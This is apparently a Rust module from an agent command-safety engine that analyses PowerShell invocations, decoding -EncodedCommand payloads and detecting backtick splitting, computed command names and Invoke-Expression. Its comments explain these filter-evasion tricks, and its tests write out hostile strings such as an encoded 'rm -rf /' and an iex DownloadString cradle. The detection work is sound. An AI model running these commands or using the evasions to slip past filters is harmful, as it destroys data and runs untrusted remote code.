//! PowerShell-aware command analysis.
//!
//! The generic splitter in [`crate::command`] treats a command line as POSIX
//! shell text: quotes are quotes, a backslash is a path separator, and a
//! wrapper's payload is whatever follows `-c`. PowerShell breaks all three
//! assumptions, and each break is a documented evasion:
//!
//! * **Parameter names abbreviate.** `powershell -EncodedCommand …` is also
//!   `-en`, `-encod`, and — by documented alias — `-e` and `-ec`. A substring
//!   check for `-enc` misses `-ec` entirely, so the encoded payload sails past
//!   as an unremarkable unknown binary.
//! * **Backtick is the escape character.** `i`e`x` is `iex`, and
//!   `Remo`ve-Item` is `Remove-Item` — a keyword can be broken anywhere without
//!   changing what runs.
//! * **A command name can be computed.** `&('i'+'ex')` and
//!   `&("{1}{0}" -f 'ex','i')` both invoke `iex`, and neither contains the
//!   string `iex` anywhere.
//!
//! So this module tokenizes with PowerShell's own rules, resolves abbreviated
//! parameters, and *decodes* `-EncodedCommand` so the real payload can be
//! analysed instead of merely flagged. The decision stays in the engine: what
//! leaves here is findings and a recovered payload.

use base64::Engine;

/// Longest encoded payload worth decoding.
///
/// Decoding is bounded because the input is attacker-shaped: a multi-megabyte
/// base64 blob should cost a refusal, not a burst of allocation.
const MAX_ENCODED_BYTES: usize = 64 * 1024;

/// Parameters this module resolves, with the single-letter aliases
/// `powershell.exe` documents on top of ordinary prefix matching.
const PARAMETERS: &[(&str, &[&str])] = &[
    ("encodedcommand", &["e", "ec"]),
    ("command", &[]),
    ("file", &[]),
];

/// What kind of obfuscation was found.
///
/// Each variant exists because it has no innocent explanation in a command an
/// agent proposes. Constructs that merely *can* be used to obfuscate — `-join`,
/// `[char]`, a here-string — are deliberately absent: they appear in ordinary
/// scripts, and a finding that maps to a hard prohibition must never fire on
/// legitimate work.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Obfuscation {
    /// `-EncodedCommand`, in any abbreviation.
    EncodedCommand,
    /// Base64 decoded inside the command, which is the manual form of the same
    /// thing.
    Base64Decode,
    /// A keyword broken up with backticks.
    BacktickSplit,
    /// The command name is computed rather than written.
    ComputedCommandName,
    /// `Invoke-Expression` / `iex`: run a string as code.
    InvokeExpression,
}

impl Obfuscation {
    pub fn describe(self) -> &'static str {
        match self {
            Obfuscation::EncodedCommand => "commande PowerShell encodée en base64",
            Obfuscation::Base64Decode => "décodage base64 puis exécution",
            Obfuscation::BacktickSplit => "mot-clé fragmenté par des accents graves",
            Obfuscation::ComputedCommandName => "nom de commande calculé à l'exécution",
            Obfuscation::InvokeExpression => "exécution d'une chaîne comme du code",
        }
    }
}

/// A payload recovered from a PowerShell invocation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Payload {
    /// The command text PowerShell will actually run, with escapes resolved.
    pub text: String,
    /// Whether it had to be decoded to get here.
    pub decoded: bool,
}

/// Everything this module has to say about one PowerShell invocation.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Analysis {
    pub obfuscation: Vec<Obfuscation>,
    pub payload: Option<Payload>,
}

/// Analyse one `powershell`/`pwsh` segment, as written.
pub fn analyse(raw: &str) -> Analysis {
    let spans = tokenize_spans(raw);
    let tokens: Vec<String> = spans.iter().map(|span| span.text.clone()).collect();

    // The payload as the user wrote it: escapes intact, one layer of the outer
    // shell's quotes removed. Obfuscation detection needs this text rather than
    // the resolved one — resolving is exactly what erases the evidence.
    let inline = parameter_span(&spans, "command")
        .and_then(|index| spans.get(index + 1).map(|span| raw[span.start..].trim()))
        .map(strip_outer_quotes);

    let mut obfuscation = obfuscation_findings(raw, inline, &tokens);

    let payload = if parameter_span(&spans, "encodedcommand").is_some() {
        parameter_span(&spans, "encodedcommand")
            .and_then(|index| tokens.get(index + 1))
            .and_then(|encoded| decode_command(encoded))
            .map(|text| Payload {
                text,
                decoded: true,
            })
    } else {
        inline.map(|text| Payload {
            text: resolve_escapes(text),
            decoded: false,
        })
    };

    // A decoded payload that itself hides something is worth naming twice: the
    // outer encoding and the inner construct are two separate decisions the
    // user is entitled to see.
    if let Some(payload) = &payload {
        if payload.decoded {
            obfuscation.extend(obfuscation_findings(
                &payload.text,
                Some(&payload.text),
                &tokenize(&payload.text),
            ));
        }
    }
    obfuscation.sort();
    obfuscation.dedup();

    Analysis {
        obfuscation,
        payload,
    }
}

/// One token and where it sits in the source text.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Span {
    text: String,
    start: usize,
    end: usize,
}

/// Split PowerShell text into tokens, honouring its quoting rules.
///
/// Differences from the POSIX tokenizer that matter here: a single-quoted
/// string has no escapes at all (`''` is the only way to write a quote), a
/// double-quoted string escapes with a backtick rather than a backslash, and a
/// bare backtick escapes the next character anywhere.
pub fn tokenize(text: &str) -> Vec<String> {
    tokenize_spans(text)
        .into_iter()
        .map(|span| span.text)
        .collect()
}

fn tokenize_spans(text: &str) -> Vec<Span> {
    let mut spans = Vec::new();
    let mut current = String::new();
    let mut start = 0;
    let mut quote: Option<char> = None;
    let mut characters = text.char_indices().peekable();

    while let Some((index, character)) = characters.next() {
        if current.is_empty() && quote.is_none() && !character.is_whitespace() {
            start = index;
        }
        match (quote, character) {
            (Some('\''), '\'') => {
                if characters.peek().map(|(_, c)| *c) == Some('\'') {
                    characters.next();
                    current.push('\'');
                } else {
                    quote = None;
                }
            }
            (Some('\''), other) => current.push(other),
            (Some('"'), '`') => {
                if let Some((_, escaped)) = characters.next() {
                    current.push(escaped);
                }
            }
            (Some('"'), '"') => quote = None,
            (Some('"'), other) => current.push(other),
            // Unreachable in practice — `quote` only ever holds one of the two
            // quote characters — but the compiler cannot know that, and a
            // silent drop here would eat input.
            (Some(_), other) => current.push(other),
            (None, '\'') | (None, '"') => quote = Some(character),
            // A bare backtick escapes the next character. This is what turns
            // `i`e`x` back into `iex` before anything compares it.
            (None, '`') => {
                if let Some((_, escaped)) = characters.next() {
                    current.push(escaped);
                }
            }
            (None, whitespace) if whitespace.is_whitespace() => {
                if !current.is_empty() {
                    spans.push(Span {
                        text: std::mem::take(&mut current),
                        start,
                        end: index,
                    });
                }
            }
            (None, other) => current.push(other),
        }
    }
    if !current.is_empty() {
        spans.push(Span {
            text: current,
            start,
            end: text.len(),
        });
    }
    spans
}

/// Resolve backtick escapes that sit outside any quoted string.
///
/// Quoted sections are left exactly as written: inside them a backtick is
/// either a real escape sequence (`` `t ``) or a literal, and rewriting either
/// would change text the next analyser has to read.
fn resolve_escapes(text: &str) -> String {
    let mut result = String::with_capacity(text.len());
    let mut quote: Option<char> = None;
    let mut characters = text.chars();

    while let Some(character) = characters.next() {
        match (quote, character) {
            (Some(open), current) if open == current => {
                quote = None;
                result.push(current);
            }
            (Some(_), other) => result.push(other),
            (None, '\'') | (None, '"') => {
                quote = Some(character);
                result.push(character);
            }
            (None, '`') => {
                if let Some(escaped) = characters.next() {
                    result.push(escaped);
                }
            }
            (None, other) => result.push(other),
        }
    }
    result
}

/// Remove one layer of matching quotes, the way the outer shell already did.
fn strip_outer_quotes(text: &str) -> &str {
    for quote in ['"', '\''] {
        if let Some(inner) = text.strip_prefix(quote).and_then(|r| r.strip_suffix(quote)) {
            return inner;
        }
    }
    text
}

/// Whether `candidate` names `full_name`.
///
/// PowerShell accepts any unambiguous prefix, so the check is "is this a prefix
/// of the full name", not "is this the full name" — plus the two single-letter
/// aliases `powershell.exe` documents. This is the whole reason `-ec` works
/// where a literal `-encodedcommand` comparison fails.
fn is_parameter(candidate: &str, full_name: &str) -> bool {
    let Some(name) = candidate
        .strip_prefix('-')
        .or_else(|| candidate.strip_prefix('/'))
    else {
        return false;
    };
    if name.is_empty() {
        return false;
    }
    let name = name.to_ascii_lowercase();
    let aliases = PARAMETERS
        .iter()
        .find(|(known, _)| *known == full_name)
        .map(|(_, aliases)| *aliases)
        .unwrap_or_default();
    full_name.starts_with(&name) || aliases.contains(&name.as_str())
}

fn parameter_span(spans: &[Span], full_name: &str) -> Option<usize> {
    spans
        .iter()
        .position(|span| is_parameter(&span.text, full_name))
}

/// Recover the command a `powershell`/`pwsh` invocation will run.
///
/// Returns `None` when the invocation runs a script *file*: its contents are
/// filesystem input, and guessing at them here would be a parser pretending to
/// be a file reader. The engine still sees the invocation itself.
pub fn extract_payload(arguments: &[String]) -> Option<Payload> {
    analyse(&arguments.join(" ")).payload
}

/// Decode a `-EncodedCommand` argument.
///
/// PowerShell requires UTF-16LE, which for ASCII text means every second byte
/// is a NUL. That is the discriminator used here: a payload with no NUL at all
/// cannot be UTF-16LE ASCII, so it is read as UTF-8 — hand-written payloads
/// often are, and a payload we fail to decode is one we cannot explain.
fn decode_command(encoded: &str) -> Option<String> {
    let trimmed = encoded.trim().trim_matches(['"', '\'']);
    if trimmed.is_empty() || trimmed.len() > MAX_ENCODED_BYTES {
        return None;
    }
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(trimmed)
        .or_else(|_| base64::engine::general_purpose::STANDARD_NO_PAD.decode(trimmed))
        .ok()?;

    if !bytes.contains(&0) {
        return String::from_utf8(bytes).ok();
    }
    if bytes.len() % 2 != 0 {
        return None;
    }
    let utf16: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
        .collect();
    let decoded = String::from_utf16_lossy(&utf16);
    (!decoded.contains('\u{fffd}')).then_some(decoded)
}

/// Obfuscation constructs in one PowerShell command.
///
/// `raw` is the whole invocation, `inline` the payload as written when there is
/// one, and `tokens` the resolved tokens. The three are separate on purpose:
/// the backtick rule has to read text *before* escapes are resolved, and the
/// parameter rule has to read tokens *after*.
fn obfuscation_findings(raw: &str, inline: Option<&str>, tokens: &[String]) -> Vec<Obfuscation> {
    let mut findings = Vec::new();
    let lower = raw.to_ascii_lowercase();

    if tokens
        .iter()
        .any(|token| is_parameter(token, "encodedcommand"))
    {
        findings.push(Obfuscation::EncodedCommand);
    }
    if lower.contains("frombase64string") {
        findings.push(Obfuscation::Base64Decode);
    }
    if has_invoke_expression(&lower) {
        findings.push(Obfuscation::InvokeExpression);
    }
    // The payload is what PowerShell parses, so it is the text whose quoting
    // rules are PowerShell's. Falling back to the whole invocation covers a
    // bare command with no wrapper.
    if has_backtick_split(inline.unwrap_or(raw)) {
        findings.push(Obfuscation::BacktickSplit);
    }
    if has_computed_command_name(inline.unwrap_or(raw)) {
        findings.push(Obfuscation::ComputedCommandName);
    }

    findings.sort();
    findings.dedup();
    findings
}

fn has_invoke_expression(lower: &str) -> bool {
    lower.contains("invoke-expression")
        || lower
            .split(|c: char| !c.is_ascii_alphanumeric() && c != '-')
            .any(|word| word == "iex")
}

/// A backtick that breaks up a word rather than escaping something.
///
/// Inside a quoted string a backtick is a real escape sequence (`` `t ``) and
/// is left alone. Outside one, a backtick with word characters on both sides
/// changes nothing about what runs — its only effect is to stop a reader,
/// human or regex, from seeing the keyword.
fn has_backtick_split(text: &str) -> bool {
    let characters: Vec<char> = text.chars().collect();
    let mut quote: Option<char> = None;
    for (index, character) in characters.iter().enumerate() {
        match (quote, *character) {
            (Some(open), current) if open == current => quote = None,
            (Some(_), _) => continue,
            (None, '\'') | (None, '"') => quote = Some(*character),
            (None, '`') => {
                let before = index.checked_sub(1).and_then(|i| characters.get(i));
                let after = characters.get(index + 1);
                if before.is_some_and(|c| c.is_alphanumeric())
                    && after.is_some_and(|c| c.is_alphanumeric())
                {
                    return true;
                }
            }
            (None, _) => continue,
        }
    }
    false
}

/// A command name assembled at runtime in call position.
///
/// `&` and `.` are PowerShell's call operators. Followed by a parenthesised
/// expression that concatenates, formats or joins strings, they run a command
/// whose name appears nowhere in the text.
fn has_computed_command_name(text: &str) -> bool {
    let characters: Vec<char> = text.chars().collect();
    for (index, character) in characters.iter().enumerate() {
        if *character != '&' && *character != '.' {
            continue;
        }
        let rest: String = characters[index + 1..].iter().collect();
        let rest = rest.trim_start();
        if !rest.starts_with('(') {
            continue;
        }
        let expression = rest.to_ascii_lowercase();
        let concatenated = expression.contains("'+") || expression.contains("\"+");
        let formatted = expression.contains("-f ") || expression.contains("-f'");
        let joined = expression.contains("-join");
        if concatenated || formatted || joined {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn encode_utf16(text: &str) -> String {
        let bytes: Vec<u8> = text
            .encode_utf16()
            .flat_map(|unit| unit.to_le_bytes())
            .collect();
        base64::engine::general_purpose::STANDARD.encode(&bytes)
    }

    #[test]
    fn backticks_are_removed_so_a_broken_keyword_is_visible() {
        assert_eq!(tokenize("i`e`x $payload"), vec!["iex", "$payload"]);
        assert_eq!(tokenize("Remo`ve-Item x"), vec!["Remove-Item", "x"]);
    }

    #[test]
    fn single_quotes_are_literal_and_double_quotes_escape_with_a_backtick() {
        assert_eq!(tokenize(r#"'a`b'"#), vec!["a`b"]);
        assert_eq!(tokenize(r#""a`"b""#), vec![r#"a"b"#]);
        assert_eq!(tokenize("'it''s'"), vec!["it's"]);
    }

    #[test]
    fn every_abbreviation_and_alias_of_encodedcommand_is_recognised() {
        // The exact evasion a literal `-enc` check misses.
        for flag in [
            "-e",
            "-ec",
            "-en",
            "-enc",
            "-encod",
            "-EncodedCommand",
            "/e",
        ] {
            assert!(
                is_parameter(flag, "encodedcommand"),
                "« {flag} » doit être reconnu comme -EncodedCommand"
            );
        }
        assert!(!is_parameter("-ex", "encodedcommand"));
        assert!(!is_parameter("payload", "encodedcommand"));
    }

    #[test]
    fn an_encoded_payload_is_decoded_not_merely_flagged() {
        let encoded = encode_utf16("rm -rf /");
        let analysis = analyse(&format!("powershell -ec {encoded}"));
        let payload = analysis.payload.expect("payload");
        assert_eq!(payload.text, "rm -rf /");
        assert!(payload.decoded);
        assert!(analysis.obfuscation.contains(&Obfuscation::EncodedCommand));
    }

    #[test]
    fn a_utf8_encoded_payload_still_decodes() {
        let encoded = base64::engine::general_purpose::STANDARD.encode("git push --force");
        let payload = analyse(&format!("powershell -EncodedCommand {encoded}"))
            .payload
            .expect("payload utf-8");
        assert_eq!(payload.text, "git push --force");
    }

    #[test]
    fn an_inline_command_is_recovered_with_its_escapes_resolved() {
        let payload = analyse(r#"powershell -NoProfile -Command "Remo`ve-Item -Recurse build""#)
            .payload
            .expect("payload");
        assert_eq!(payload.text, "Remove-Item -Recurse build");
        assert!(!payload.decoded);
    }

    #[test]
    fn a_script_file_invocation_yields_no_payload() {
        // Its contents are filesystem input, not something to guess at here.
        assert!(analyse("powershell -File .\\deploy.ps1").payload.is_none());
    }

    #[test]
    fn garbage_and_oversized_payloads_decode_to_nothing() {
        assert!(decode_command("not base64 !!").is_none());
        assert!(decode_command("").is_none());
        assert!(decode_command(&"A".repeat(MAX_ENCODED_BYTES + 4)).is_none());
    }

    #[test]
    fn obfuscation_catches_the_constructs_with_no_innocent_use() {
        for command in [
            "powershell -ec SQBFAFgA",
            "powershell -Command [Convert]::FromBase64String($x)",
            "powershell -Command iex $payload",
            "powershell -Command Invoke-Expression $payload",
            r#"powershell -Command "i`e`x $payload""#,
            "powershell -Command &('i'+'ex')",
            r#"powershell -Command &("{1}{0}" -f 'ex','i')"#,
        ] {
            assert!(
                !analyse(command).obfuscation.is_empty(),
                "« {command} » doit être détecté comme obfusqué"
            );
        }
    }

    #[test]
    fn ordinary_powershell_is_not_flagged() {
        // These all use constructs that *can* obfuscate. Flagging them would
        // make a hard prohibition fire on ordinary scripting.
        for command in [
            "powershell -Command Get-ChildItem -Recurse",
            "powershell -Command $names -join ', '",
            "powershell -Command [char]65",
            r#"powershell -Command "Write-Host `"build`tok`"""#,
            "powershell -File .\\build.ps1",
            "powershell -Command Get-Content log.txt | Select-String 'error'",
        ] {
            assert!(
                analyse(command).obfuscation.is_empty(),
                "« {command} » ne doit rien déclencher, obtenu {:?}",
                analyse(command).obfuscation
            );
        }
    }

    #[test]
    fn a_line_continuation_backtick_is_not_a_split_keyword() {
        assert!(!has_backtick_split("Get-ChildItem `\n  -Recurse"));
        assert!(!has_backtick_split("Write-Host \"a`tb\""));
        assert!(has_backtick_split("i`ex"));
    }

    #[test]
    fn an_encoded_payload_hiding_another_construct_reports_both() {
        let encoded = encode_utf16("iex (New-Object Net.WebClient).DownloadString('http://x')");
        let analysis = analyse(&format!("powershell -ec {encoded}"));
        assert!(analysis.obfuscation.contains(&Obfuscation::EncodedCommand));
        assert!(analysis
            .obfuscation
            .contains(&Obfuscation::InvokeExpression));
    }
}
